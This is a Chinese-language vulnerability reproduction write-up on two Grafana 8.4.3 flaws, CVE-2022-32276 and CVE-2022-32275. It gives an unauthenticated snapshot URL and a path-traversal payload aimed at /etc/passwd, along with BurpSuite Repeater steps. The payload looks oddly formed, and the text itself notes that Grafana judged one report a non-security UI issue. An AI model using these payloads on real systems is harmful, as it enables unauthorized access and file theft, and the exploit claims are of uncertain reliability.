0x00 漏洞简述

Grafana是一个开源的可视化和分析平台，上周CVE-2022-32276和CVE-2022-32275被报告为影响Grafana的漏洞。在此之前，一位社区成员联系了Grafana安全团队，报告我们评估为非安全影响 UI 问题的漏洞报告。


0x01 漏洞影响版本

Grafana 8.4.3 (b7d2911ca)，适用于 8.5.5


0x02 漏洞复现

一、CVE-2022-32276

未经身份验证和经过身份验证的用户可以使用随机密钥参数发送错误的快照查询请求，通过登录页面访问系统仪表板区域。


  1.   登录页面


2. 未经身份验证的列表访问

已经证实，知道易受攻击目录的未经身份验证的用户可以输入随机 ID 值，从而允许未经身份验证访问住院系统页面。使用的参数：
/dashboard/snapshot/*?orgId=0


3. 未经身份验证的仪表板菜单访问


4. 未经身份验证的过滤器菜单访问



二、CVE-2022-32275

该漏洞是由于Grafana存在未授权访问漏洞，攻击者可以通过特定URL，访问任意用户系统界面及读取任意文件。当遍历路径被探索时，身份验证系统重定向到一个内部系统页面，攻击者可利用该漏洞读取任意文件。
在8.4.3版本中，Grafana允许通过以下参数读取文件等：
/dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd?orgId=1

1. 登录页面


2. 在HTTP请求中注入参数

Payload：

通过添加以下参数更改请求

/{{constructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd?orgId=1

编码：

/dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd?orgId=1



3. 未经身份验证的访问



三、POC验证


  1.  通过BurpSuite拦截请求数据包


2. 将请求发送到 BurpSuite Repeater 模块并将请求标头更改为：

/dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd?orgId=1




0x03 漏洞修复

该问题已在新版本中修复，建议用户更新到最新版本。
